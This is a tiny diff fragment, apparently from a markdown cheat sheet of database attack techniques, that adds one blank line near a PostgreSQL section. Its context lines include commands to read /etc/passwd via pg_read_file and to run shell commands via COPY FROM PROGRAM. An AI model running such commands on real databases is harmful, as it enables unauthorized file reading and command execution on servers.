@@ -66,6 +66,7 @@ SELECT pg_read_file('/etc/passwd');
 -- Command execution (if pg_execute_server_program extension)
 COPY cmd_output FROM PROGRAM 'id';
 ```
+
 ---
 
 ## 2. PostgreSQL
